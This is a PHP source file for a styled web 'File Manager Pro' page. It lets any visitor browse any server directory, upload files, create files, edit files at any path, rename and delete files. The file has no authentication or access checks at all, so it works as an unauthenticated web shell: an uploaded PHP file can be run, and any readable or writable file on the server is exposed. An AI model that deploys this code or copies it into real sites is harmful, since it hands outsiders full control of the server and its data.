<?php
// ======== Current Directory Setup ========
$dir = isset($_GET['dir']) ? urldecode($_GET['dir']) : __DIR__;
if (!file_exists($dir)) $dir = __DIR__;
$dir = realpath($dir);

$message = '';
$messageType = '';

// ======== Delete File ========
if (isset($_GET['delete'])) {
    $file = realpath($dir . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($file && is_file($file)) {
        if (unlink($file)) {
            $message = "✅ File deleted successfully!";
            $messageType = 'success';
        } else {
            $message = "❌ Failed to delete file!";
            $messageType = 'error';
        }
    } else {
        $message = "❌ File not found!";
        $messageType = 'error';
    }
    header("Location: ?dir=" . urlencode($dir) . "&message=" . urlencode($message) . "&type=" . $messageType);
    exit;
}

// ======== Rename File ========
if (isset($_POST['rename_action']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $_POST['old_name'];
    $newPath = $dir . DIRECTORY_SEPARATOR . trim($_POST['new_name']);
    
    if (file_exists($oldPath) && !empty($_POST['new_name']) && !file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            $message = "✅ Renamed successfully!";
            $messageType = 'success';
        } else {
            $message = "❌ Failed to rename!";
            $messageType = 'error';
        }
    } else {
        $message = "❌ Invalid name or file already exists!";
        $messageType = 'error';
    }
    header("Location: ?dir=" . urlencode($dir) . "&message=" . urlencode($message) . "&type=" . $messageType);
    exit;
}

// ======== Upload & Create ========
if (isset($_FILES['upload'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $targetFile)) {
        $message = "✅ File uploaded successfully!";
        $messageType = 'success';
    } else {
        $message = "❌ Failed to upload file!";
        $messageType = 'error';
    }
    header("Location: ?dir=" . urlencode($dir) . "&message=" . urlencode($message) . "&type=" . $messageType);
    exit;
}

if (isset($_POST['new_file']) && isset($_POST['filename'])) {
    $filename = trim($_POST['filename']);
    if (!empty($filename)) {
        if (!preg_match('/\.[a-zA-Z0-9]+$/', $filename)) $filename .= '.txt';
        $newFilePath = $dir . DIRECTORY_SEPARATOR . basename($filename);
        if (!file_exists($newFilePath)) {
            if (file_put_contents($newFilePath, '') !== false) {
                $message = "✅ File created successfully!";
                $messageType = 'success';
                header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode(basename($filename)) . "&message=" . urlencode($message) . "&type=" . $messageType);
                exit;
            }
        } else {
            $message = "❌ File already exists!";
            $messageType = 'error';
        }
    }
    header("Location: ?dir=" . urlencode($dir) . "&message=" . urlencode($message) . "&type=" . $messageType);
    exit;
}

if (isset($_POST['save']) && isset($_POST['file']) && isset($_POST['content'])) {
    $fileToSave = $_POST['file'];
    if (file_exists($fileToSave) && is_file($fileToSave)) {
        if (file_put_contents($fileToSave, $_POST['content']) !== false) {
            $message = "✅ File saved successfully!";
            $messageType = 'success';
        } else {
            $message = "❌ Failed to save file!";
            $messageType = 'error';
        }
    }
    header("Location: ?dir=" . urlencode($dir) . "&message=" . urlencode($message) . "&type=" . $messageType);
    exit;
}

if (isset($_GET['message'])) {
    $message = $_GET['message'];
    $messageType = isset($_GET['type']) ? $_GET['type'] : 'success';
}

$editFile = isset($_GET['edit']) ? realpath($dir . DIRECTORY_SEPARATOR . $_GET['edit']) : null;
if ($editFile && (!is_file($editFile) || !is_readable($editFile))) $editFile = null;

$files = scandir($dir) ?: [];

function breadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $build = '';
    $first = true;
    foreach ($parts as $part) {
        if ($part === '') {
            $build = DIRECTORY_SEPARATOR;
            echo "<a href='?dir=" . urlencode(DIRECTORY_SEPARATOR) . "'>/</a>";
            $first = false;
            continue;
        }
        if ($build === DIRECTORY_SEPARATOR) $build .= $part; else $build .= DIRECTORY_SEPARATOR . $part;
        if (!$first) echo " / ";
        echo "<a href='?dir=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a>";
        $first = false;
    }
}

function fileIcon($filename){
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','bmp'=>'🖼️',
        'txt'=>'📄','md'=>'📄','log'=>'📄',
        'php'=>'🐘','js'=>'📜','css'=>'🎨','html'=>'🌐','json'=>'🗂️',
        'zip'=>'🗜️','rar'=>'🗜️','pdf'=>'📕'
    ];
    return $icons[$ext] ?? '📄';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>File Manager Pro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
:root {
    --primary: #2563eb; --bg: #f8fafc; --card:#fff; --border:#e2e8f0; --text:#1e2937; --text-light:#64748b;
    --hover:#f1f5f9; --success:#10b981; --error:#ef4444;
}
body{font-family:system-ui,sans-serif;background:var(--bg);color:var(--text);margin:0;padding:20px;}
.container{max-width:1480px;margin:0 auto;}
.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px;}
.logo{font-size:1.65rem;font-weight:700;color:var(--primary);}
.btn{padding:10px 20px;border-radius:12px;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;gap:6px;cursor:pointer;transition:0.2s;}
.btn-primary{background:var(--primary);color:#fff;border:none;}
.btn-primary:hover{background:#1e40af;}
.sidebar{width:220px;background:var(--card);border-radius:20px;padding:20px;box-shadow:0 5px 15px rgba(0,0,0,0.08);position:sticky;top:20px;}
.sidebar a{display:block;padding:12px 20px;color:var(--text-light);text-decoration:none;font-weight:500;transition:0.2s;margin-bottom:4px;}
.sidebar a:hover,.sidebar a.active{background:var(--hover);color:var(--primary);border-left:4px solid var(--primary);}
.main-content{display:flex;gap:20px;}
.content-area{flex:1;}
.breadcrumb{background:var(--card);padding:12px 18px;border-radius:14px;margin-bottom:20px;border:1px solid var(--border);}
.breadcrumb a{color:var(--primary);text-decoration:none;}
.card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:20px;box-shadow:0 5px 15px rgba(0,0,0,0.07);}
table{width:100%;border-collapse:collapse;}
th{padding:14px 20px;text-align:left;color:var(--text-light);border-bottom:2px solid var(--border);}
td{padding:14px 20px;border-bottom:1px solid var(--border);}
tr:hover{background:var(--hover);}
.file-actions{display:flex;gap:6px;justify-content:center;}
.action-btn{padding:6px 12px;border-radius:10px;font-size:0.9rem;text-decoration:none;display:inline-flex;align-items:center;gap:4px;transition:0.2s;}
.edit-btn{background:#dbeafe;color:#1e40af;}
.rename-btn{background:#fef3c7;color:#92400e;}
.delete-btn{background:#fee2e2;color:#b91c1c;}
.action-btn:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.1);}
.message{padding:12px 18px;border-radius:14px;margin-bottom:18px;font-weight:500;box-shadow:0 4px 12px rgba(0,0,0,0.08);}
.success{background:#ecfdf5;color:var(--success);border-left:5px solid var(--success);}
.error{background:#fef2f2;color:var(--error);border-left:5px solid var(--error);}
.rename-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);align-items:center;justify-content:center;z-index:2000;}
.rename-box{background:white;width:400px;border-radius:20px;padding:24px;box-shadow:0 20px 60px rgba(0,0,0,0.25);}
.rename-box input, .rename-box textarea{width:100%;padding:12px;border:1px solid var(--border);border-radius:12px;font-family:Consolas,monospace;}
.rename-footer{display:flex;justify-content:flex-end;gap:10px;margin-top:16px;}
.search-box{margin-bottom:16px;}
input.search-input{padding:10px 14px;border-radius:12px;border:1px solid var(--border);width:100%;}
.drag-area{border:2px dashed var(--border);padding:30px;text-align:center;border-radius:16px;margin-bottom:20px;color:var(--text-light);}
.drag-area.dragover{background:var(--hover);}
.dark-mode{background:#1e2937;color:#f8fafc;}
.dark-mode .card,.dark-mode .breadcrumb,.dark-mode .sidebar{background:#334155;color:#f8fafc;border-color:#475569;}
.dark-mode table th,.dark-mode table td{border-color:#475569;color:#f8fafc;}
.dark-mode .sidebar a{color:#cbd5e1;}
.dark-mode .sidebar a.active,.dark-mode .sidebar a:hover{color:#2563eb;border-left:4px solid #2563eb;background:#475569;}
</style>
</head>
<body>
<div class="container">

<div class="top-bar">
    <div class="logo">📁 File Manager Pro</div>
    <div>
        <a href="?dir=<?php echo urlencode(__DIR__); ?>" class="btn">🏠 Home</a>
        <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>" class="btn">🌐 Root</a>
        <button class="btn btn-primary" onclick="document.body.classList.toggle('dark-mode')">🌓 Dark Mode</button>
    </div>
</div>

<div class="main-content">
<div class="sidebar">
    <a href="#" class="active">📂 All Files</a>
    <a href="#">📸 Photos</a>
    <a href="#">🔗 Shared</a>
    <a href="#">🗑️ Deleted Files</a>
</div>

<div class="content-area">

<?php if($message): ?>
<div class="message <?php echo $messageType==='success'?'success':'error'; ?>">
    <?php echo htmlspecialchars($message); ?>
</div>
<?php endif; ?>

<div class="breadcrumb">
📁 <?php breadcrumb($dir); ?>
</div>

<div class="search-box">
<input type="text" class="search-input" id="searchInput" placeholder="🔍 Search files...">
</div>

<div class="actions-bar" style="margin-bottom:16px;">
<form method="POST" enctype="multipart/form-data" style="display:inline-block;">
    <label for="upload" class="btn btn-primary" style="cursor:pointer;">📤 Upload File</label>
    <input type="file" name="upload" id="upload" style="display:none;" onchange="this.form.submit()">
</form>

<form method="POST" style="display:inline-flex; gap:10px;">
    <input type="text" name="filename" placeholder="newfile.txt" style="padding:10px;border:1px solid var(--border);border-radius:12px;">
    <button type="submit" name="new_file" class="btn btn-primary">✨ New File</button>
</form>
<?php if($dir!==DIRECTORY_SEPARATOR && dirname($dir)!=$dir): ?>
    <a href="?dir=<?php echo urlencode(dirname($dir)); ?>" class="btn" style="background:#f1f5f9;color:#475569;">⬅️ Back</a>
<?php endif; ?>
</div>

<div class="drag-area" id="dragArea">📥 Drag & Drop files here to upload</div>

<div class="card">
<table id="filesTable">
<thead>
<tr><th>Name</th><th style="text-align:center;">Actions</th></tr>
</thead>
<tbody>
<?php
$hasItems=false;
if($dir!==DIRECTORY_SEPARATOR && $dir!=__DIR__){
    echo "<tr><td class='file-name'>📂 <a href='?dir=".urlencode(dirname($dir))."'>.. (Parent Folder)</a></td><td></td></tr>";
    $hasItems=true;
}

foreach($files as $f){
    if($f=='.'||$f=='..') continue;
    $path=$dir.DIRECTORY_SEPARATOR.$f;
    if(!file_exists($path)) continue;
    $hasItems=true;
    $isDir=is_dir($path);
    $sizeStr=$isDir?'':(function($s){return $s<1024?$s.' B':($s<1048576?round($s/1024,1).' KB':round($s/1048576,1).' MB');})(filesize($path));
    echo "<tr class='file-row'>";
    if ($isDir) {
    echo "<td class='file-name'>📁 <a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($f) . "</a></td>";
	} else {
		echo "<td class='file-name'>" . fileIcon($f) . " " . htmlspecialchars($f) . " <span style='color:#64748b; font-size:0.88rem;'>($sizeStr)</span></td>";
	}
	
    echo "<td style='text-align:center;'>
        <div class='file-actions'>"
        .(!$isDir?"<a href='?dir=".urlencode($dir)."&edit=".urlencode($f)."' class='action-btn edit-btn'>✏️ Edit</a>":"")
        ."<a href='#' onclick='showRenameModal(\"".addslashes($f)."\")' class='action-btn rename-btn'>✏️ Rename</a>
        <a href='?dir=".urlencode($dir)."&delete=".urlencode($f)."' class='action-btn delete-btn' onclick='return confirm(\"Are you sure you want to delete ".addslashes($f)."?\")'>🗑️ Delete</a>
        </div></td>";
    echo "</tr>";
}
if(!$hasItems) echo "<tr><td colspan='2' style='padding:60px;text-align:center;color:#94a3b8;'>This folder is empty 📭</td></tr>";
?>
</tbody>
</table>
</div>
</div></div></div>

<!-- Edit Modal -->
<?php if($editFile): ?>
<div class="rename-modal" style="display:flex;">
    <div class="rename-box" style="width:90%;max-width:960px;">
        <h3>✏️ Editing: <?php echo htmlspecialchars(basename($editFile)); ?></h3>
        <form method="POST">
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($editFile); ?>">
            <textarea name="content" style="width:100%;min-height:500px;padding:12px;border:1px solid var(--border);border-radius:12px;font-family:Consolas,monospace;"><?php echo htmlspecialchars(file_get_contents($editFile)); ?></textarea>
            <div class="rename-footer">
                <a href="?dir=<?php echo urlencode($dir); ?>" class="btn" style="background:#f1f5f9;color:#475569;">Cancel</a>
                <button type="submit" name="save" class="btn btn-primary">💾 Save Changes</button>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

<!-- Rename Modal -->
<div id="renameModal" class="rename-modal">
    <div class="rename-box">
        <h3>Rename Item</h3>
        <form method="POST" id="renameForm">
            <input type="hidden" name="rename_action" value="1">
            <input type="hidden" name="old_name" id="oldNameInput">
            <input type="text" name="new_name" id="newNameInput" placeholder="New name">
            <div class="rename-footer">
                <button type="button" class="btn" onclick="closeRenameModal()">Cancel</button>
                <button type="submit" class="btn btn-primary">Rename</button>
            </div>
        </form>
    </div>
</div>

<script>
// Search Filter
document.getElementById('searchInput').addEventListener('input', function(){
    let filter = this.value.toLowerCase();
    document.querySelectorAll('#filesTable tbody tr').forEach(tr=>{
        tr.style.display = tr.querySelector('.file-name').textContent.toLowerCase().includes(filter)?'':'none';
    });
});

// Rename Modal
function showRenameModal(name){
    document.getElementById('renameModal').style.display='flex';
    document.getElementById('oldNameInput').value=name;
    document.getElementById('newNameInput').value=name;
}
function closeRenameModal(){
    document.getElementById('renameModal').style.display='none';
}

// Drag & Drop Upload
const dragArea=document.getElementById('dragArea');
dragArea.addEventListener('dragover',e=>{e.preventDefault();dragArea.classList.add('dragover');});
dragArea.addEventListener('dragleave',e=>{dragArea.classList.remove('dragover');});
dragArea.addEventListener('drop',e=>{
    e.preventDefault(); dragArea.classList.remove('dragover');
    const files=e.dataTransfer.files;
    if(files.length>0){
        const formData=new FormData();
        formData.append('upload',files[0]);
        fetch('',{method:'POST',body:formData}).then(()=>location.reload());
    }
});
</script>

</body>
</html>